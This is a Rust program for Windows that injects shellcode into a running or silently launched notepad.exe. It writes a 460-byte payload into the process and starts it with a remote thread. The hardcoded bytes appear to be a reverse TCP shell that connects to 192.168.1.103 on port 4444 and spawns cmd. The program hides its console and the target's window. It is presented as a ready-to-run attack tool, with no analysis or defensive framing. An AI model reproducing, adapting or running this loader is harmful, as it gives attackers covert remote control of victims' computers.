#![windows_subsystem = "windows"]

use std::ffi::CString;
use std::mem;
use std::ptr;
use std::str;
use winapi::ctypes::c_void;
use winapi::shared::minwindef::DWORD;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess, CreateProcessA};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualFreeEx};
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};

fn get_process_id_by_name(process_name: &str) -> DWORD {
    // Create a snapshot of the running processes
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if snapshot == ptr::null_mut() {
        return 0;
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as DWORD;

    let mut process_id: DWORD = 0;

    if unsafe { Process32First(snapshot, &mut process_entry) } != 0 {
        loop {
            let cstring = unsafe {
                // Get the current process name
                let cstring = CString::from_raw(process_entry.szExeFile.as_mut_ptr());
                let entry_name = str::from_utf8(cstring.to_bytes()).unwrap().to_owned();
                mem::forget(cstring); // Prevent CString from freeing the memory
                entry_name
            };
            if cstring == process_name {
                process_id = process_entry.th32ProcessID;
                break;
            }
            if unsafe { Process32Next(snapshot, &mut process_entry) } == 0 {
                break;
            }
        }
    }

    unsafe {
        CloseHandle(snapshot);
    }

    process_id
}

fn create_process(process_name: &str) -> DWORD {
    use winapi::um::winbase::{STARTF_USESHOWWINDOW};
    use winapi::um::winuser::{SW_HIDE};

    let c_process_name = CString::new(process_name).unwrap();
    let mut startup_info: winapi::um::processthreadsapi::STARTUPINFOA = unsafe { mem::zeroed() };
    let mut process_info: winapi::um::processthreadsapi::PROCESS_INFORMATION = unsafe { mem::zeroed() };

    startup_info.cb = mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOA>() as DWORD;

    // Imposta i flag per nascondere la finestra
    startup_info.dwFlags = STARTF_USESHOWWINDOW; // Usa il flag per wShowWindow
    startup_info.wShowWindow = SW_HIDE as u16;   // Converte SW_HIDE in u16

    // Crea il nuovo processo
    if unsafe {
        CreateProcessA(
            c_process_name.as_ptr(), // Usa il percorso completo in lpApplicationName
            ptr::null_mut(),         // Nessun argomento da riga di comando
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            0,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut startup_info,
            &mut process_info,
        )
    } == 0 {
        let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
        println!("Failed to create process. Error code: {}", error_code);
        return 0;
    }

    unsafe { CloseHandle(process_info.hProcess) }; // Chiudi l'handle dopo l'uso
    process_info.dwProcessId // Restituisci il PID del processo creato
}




fn inject_code(process_id: DWORD, code: &[u8]) -> bool {
    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) };
    if process_handle.is_null() {
        println!("Error opening process handle");
        return false;
    }

    let remote_memory = unsafe {
        // Allocate memory in the target process
        VirtualAllocEx(
            process_handle,
            ptr::null_mut(),
            code.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        ) as *mut c_void
    };
    if remote_memory.is_null() {
        println!("Error allocating remote memory");
        unsafe { CloseHandle(process_handle) };
        return false;
    }

    let mut bytes_written: usize = 0;
    let write_status = unsafe {
        // Write the code to the remote memory
        WriteProcessMemory(
            process_handle,
            remote_memory,
            code.as_ptr() as *const c_void,
            code.len(),
            &mut bytes_written as *mut usize,
        )
    };
    if write_status == 0 {
        println!("Error writing code to remote memory");
        unsafe {
            VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);
            CloseHandle(process_handle);
        }
        return false;
    }

    let _remote_thread = unsafe {
        // Create a remote thread to execute the injected code
        CreateRemoteThread(
            process_handle,
            ptr::null_mut(),
            0,
            std::mem::transmute(remote_memory),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        )
    };
    
    if _remote_thread.is_null() {
        println!("Error creating remote thread");
        unsafe {
            VirtualFreeEx(process_handle, remote_memory, 0, MEM_RELEASE);
            CloseHandle(process_handle);
        }
        return false;
    }

    // Do not wait for the remote thread to finish and do not close the handle

    true
}




fn main() {
    let process_name = "C:\\Windows\\System32\\notepad.exe";
    
    // Check for existing process ID
    let mut process_id = get_process_id_by_name(process_name);
    
    // If not found, create it
    if process_id == 0 {
        println!("Process not found. Creating new instance of {}", process_name);
        process_id = create_process(process_name);
        
        if process_id == 0 {
            println!("Failed to create new instance of {}", process_name);
            return;
        }
        
        println!("Created new instance of {} with PID: {}", process_name, process_id);
    } else {
        println!("Found existing instance of {} with PID: {}", process_name, process_id);
    }

    let code: [u8; 460] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 
        0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 
        0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 
        0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 
        0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 
        0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 
        0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 
        0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 
        0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
        0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 
        0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 
        0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 
        0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 
        0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 
        0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x01, 0x67, 
        0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 
        0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 
        0x80, 0x6b, 0x00, 0xff, 0xd5, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 
        0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 
        0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 
        0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x48, 0x81, 
        0xc4, 0x40, 0x02, 0x00, 0x00, 0x49, 0xb8, 0x63, 0x6d, 0x64, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x57, 0x57, 0x4d, 0x31, 0xc0, 
        0x6a, 0x0d, 0x59, 0x41, 0x50, 0xe2, 0xfc, 0x66, 0xc7, 0x44, 0x24, 0x54, 0x01, 0x01, 
        0x48, 0x8d, 0x44, 0x24, 0x18, 0xc6, 0x00, 0x68, 0x48, 0x89, 0xe6, 0x56, 0x50, 0x41, 
        0x50, 0x41, 0x50, 0x41, 0x50, 0x49, 0xff, 0xc0, 0x41, 0x50, 0x49, 0xff, 0xc8, 0x4d, 
        0x89, 0xc1, 0x4c, 0x89, 0xc1, 0x41, 0xba, 0x79, 0xcc, 0x3f, 0x86, 0xff, 0xd5, 0x48, 
        0x31, 0xd2, 0x48, 0xff, 0xca, 0x8b, 0x0e, 0x41, 0xba, 0x08, 0x87, 0x1d, 0x60, 0xff, 
        0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 
        0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5
    ];


    if inject_code(process_id, &code) {
        println!("Code injected successfully");
    } else {
        println!("Code injection failed");
    }
}
